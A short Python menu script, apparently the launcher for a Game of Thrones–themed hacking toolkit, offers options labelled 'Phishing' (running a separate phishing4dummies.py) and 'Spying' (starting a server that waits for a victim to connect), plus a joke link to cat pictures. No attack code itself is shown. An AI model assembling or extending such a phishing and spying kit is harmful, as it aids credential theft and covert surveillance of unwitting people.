
######################################################################
# Strongly recommended to read readme.txt file before running script #
######################################################################

import sys
import runpy
import webbrowser
from funky import my_server





main_menu = input('Welcome back Lord Varys. What we gonna do today?\n'
             '[1] Phishing\n'
             '[2] Spying\n'
             '[3] Little finger is coming!\n'
             '[All other] Exit\n>>> ')
if main_menu == '1':
    print('Running on localhost...')
    runpy.run_path("phishing4dummies.py")
elif main_menu == '2':
    print('Waiting for little bird to connect...')
    my_server()
elif main_menu == '3':
    webbrowser.open('https://id.pinterest.com/gentlemeows/funny-cat-pictures/', new=2)
else:
    sys.exit()